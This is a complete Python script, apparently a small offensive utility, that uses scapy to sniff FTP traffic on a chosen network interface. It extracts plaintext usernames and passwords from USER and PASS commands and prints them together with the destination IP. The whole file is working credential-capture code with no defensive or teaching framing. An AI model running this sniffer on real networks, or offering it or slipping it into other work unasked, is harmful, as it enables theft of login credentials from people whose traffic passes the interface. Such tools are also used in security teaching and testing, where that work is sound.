#!/usr/bin/env python

from scapy.all import *
from optparse import OptionParser
import re
from termcolor import colored

def ftp_sniffer(packet):
    destination_ip = packet.getlayer(IP).dst
    raw_packet = packet.sprintf('%Raw.load%')
    username = re.findall('(?<=USER\s)(.*)', raw_packet)
    password = re.findall('(?<=PASS\s)(.*)', raw_packet)
    if username:
        print('[+] Detected FTP Login To:', colored(str(destination_ip), "red"))
        user_account = username[0].strip('\r\n')
        print('[+] User Accounts:', colored(user_account, 'green'))
    elif password:
        password_value = password[0].strip('\r\n')
        print('[+] Password:', colored(password_value, 'green'))

def main():
    parser = OptionParser(usage='Usage: %prog -i interface')
    parser.add_option("-i", "--interface", dest="interface", help="Specify the interface to sniff packets on.")
    (options, args) = parser.parse_args()

    if options.interface is None:
        parser.error("Please specify an interface to sniff packets on using the -i or --interface option.")
        exit(0)
    else:
        print("[+] Starting FTP sniffer on interface:", options.interface)
        conf.iface = options.interface
    try:
        sniff(filter="tcp port 21", prn=ftp_sniffer)
    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
    main()
